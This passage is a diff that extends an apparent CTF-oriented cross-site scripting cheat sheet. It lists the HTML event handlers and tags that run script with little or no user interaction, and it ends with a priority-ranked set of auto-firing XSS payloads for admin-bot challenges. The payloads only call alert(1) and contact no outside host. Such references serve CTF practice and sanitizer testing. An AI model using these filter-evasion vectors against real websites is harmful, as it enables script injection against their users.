@@ -258,3 +258,140 @@ as an attribute. Tag-by-tag best handler:
 - `onfocus` on document/body: `<body onfocus=alert(1)>` + any
   focus event — fires when the window gains focus; bots often
   blur/focus — unreliable, don't lead with it.
+
+---
+
+## 12. Complete handler-event reference — every `on*` worth trying
+
+When a filter kills specific handler names, rotate through this
+list. Autofire = fires without user interaction in a normal render.
+
+### Load/error events — autofire
+
+| Tag + handler | Fires when | Reliability |
+|---|---|---|
+| `<img src=x onerror>` | bad src, always | ★★★★★ |
+| `<svg onload>` | element parse | ★★★★★ |
+| `<body onload>` | document load | ★★★★★ |
+| `<iframe onload>` | frame load | ★★★★★ |
+| `<video><source onerror>` | source fail | ★★★★ |
+| `<video src=x onerror>` | media fail | ★★★★ |
+| `<audio src=x onerror>` | media fail | ★★★★ |
+| `<img srcset=x onerror>` | srcset fail | ★★★★ |
+| `<image href=x onerror>` (svg) | image fail | ★★★★ |
+| `<object onerror>` | data fail | ★★★ |
+| `<embed onerror>` | plugin fail | ★★★ (deprecated) |
+| `<script onerror src=x>` | script fail | ★★★ |
+| `<link rel=stylesheet onerror href=x>` | css fail | ★★★ |
+| `<input type=image src=x onerror>` | image fail | ★★★★ |
+| `<track src=x onerror>` inside video | track fail | ★★ |
+| `<marquee onstart>` | marquee start | ★★★★ (Chrome) |
+| `<marquee onfinish>` | after start+loop | ★★ |
+| `<details open ontoggle>` | open at parse | ★★★★ |
+| `<dialog open>` + `onclose` | needs close() | ★★ |
+| `<svg><animate onbegin>` | animation begin | ★★★ (SMIL) |
+| `<svg><set onbegin>` | set begin | ★★ |
+| `<svg onbegin>` | svg SMIL begin | ★★ |
+
+### Focus events — autofire only with `autofocus`
+
+| Tag + handler | Fires when |
+|---|---|
+| `<input onfocus autofocus>` | autofocus at parse |
+| `<input onfocusin autofocus>` | focusin variant |
+| `<select onfocus autofocus>` | same |
+| `<textarea onfocus autofocus>` | same |
+| `<button onfocus autofocus>` | same |
+| `<a href=# onfocus autofocus>` | same |
+| `<keygen onfocus autofocus>` | legacy Chrome |
+| `<iframe onfocus autofocus>` | focus variant |
+| `document.body onfocus` | window focus — bots blur/focus unpredictably |
+| `contenteditable onfocus autofocus` | editable elem + autofocus |
+| `<div tabindex=0 onfocus autofocus>` | tabindex trick on any tag |
+
+Multiple autofocus elements: only the FIRST wins. If the page already
+has autofocus (a search box), your autofocus never fires — check the
+host page for existing `autofocus` attrs before relying on this.
+
+### Pointer/hover events — interaction required
+
+```html
+onmouseover  onmouseenter  onmousemove  onmouseout
+onclick      onauxclick    oncontextmenu  ondblclick
+onpointerover  onpointerenter  onpointerdown  onpointerup
+ontouchstart  ontouchend  ontouchmove     -- mobile bots
+ondragstart  ondragend  ondrop
+```
+
+For bots: treat as dead unless the challenge guarantees interaction.
+Exception: a `<a href=javascript:>` on a link the BOT clicks — some
+bots click the first link; formaction on submit-buttons the bot
+submits.
+
+### Keyboard/input events
+
+```html
+onkeypress onkeydown onkeyup            -- needs typing
+oninput onchange oninvalid               -- form events
+oninvalid — fires on form SUBMIT when a required field is empty:
+<form><input required oninvalid=alert(1)><input type=submit></form>
+   -- bot that submits the form triggers it
+```
+
+### Media/scroll/misc events
+
+```html
+<video onplay autoplay><source src=x>    -- autoplay + onplay
+<video autoplay onplaying=alert(1) src=valid.mp4>  -- needs real media
+<audio autoplay onplay=alert(1) src=x>
+<details ontoggle open>                  -- covered above
+<div onscroll=alert(1) style="overflow:scroll;height:10px"><br>x200</div>
+   -- scroll fires only if user/JS scrolls
+<body onpageshow=alert(1)>               -- fires on page show — good!
+<body onpageshow=alert(1)>               -- like onload, plus bfcache
+window.onhashchange — needs hash change
+<body onresize> — needs resize
+<body onblur>/<body onfocus> — window focus events, unreliable for bots
+```
+
+### SMIL/SVG animation events
+
+```xml
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><animate onend=alert(1) dur=0.01s attributeName=x>
+<svg><a><animate attributeName=href values="javascript:alert(1)" begin="0s">
+   -- animate CAN morph href into javascript: on timer
+```
+
+### The rare-but-real ones
+
+```html
+<object data=x onerror=alert(1)>             -- object error
+<embed onerror=alert(1) src=x>               -- deprecated
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X</maction></math>
+<svg><a><animate attributeName=href values=javascript:alert(1)><text>x</text></a></svg>
+<svg><use href="data:image/svg+xml;base64,...#x"></use></svg>
+<table background=javascript:alert(1)>       -- dead modern
+<isindex type=image src=x onerror=alert(1)>  -- dead
+<form><button popovertarget=x>x</button><div id=x popover onbeforetoggle=alert(1)>
+   -- popover API events — onbeforetoggle fires on show
+<div popover id=x onbeforetoggle=alert(1)></div><button popovertarget=x>y</button>
+```
+
+---
+
+## 13. Autofire priority order for admin-bots
+
+```text
+1. <svg onload=alert(1)>                    -- zero deps, zero network
+2. <img src=x onerror=alert(1)>             -- error guaranteed
+3. <body onload=alert(1)>                   -- needs body-context
+4. <input autofocus onfocus=alert(1)>        -- loses to existing autofocus
+5. <details open ontoggle=alert(1)>          -- parse-time toggle
+6. <marquee onstart=alert(1)>                -- Chrome ok
+7. <iframe onload=alert(1)>                  -- needs iframe allowed
+8. <video><source onerror=alert(1)>          -- nested variant
+9. <meta refresh url=javascript:>           -- navigation-based
+10. <svg><animate onbegin=alert(1)...>       -- SMIL, some sanitizers miss
+```
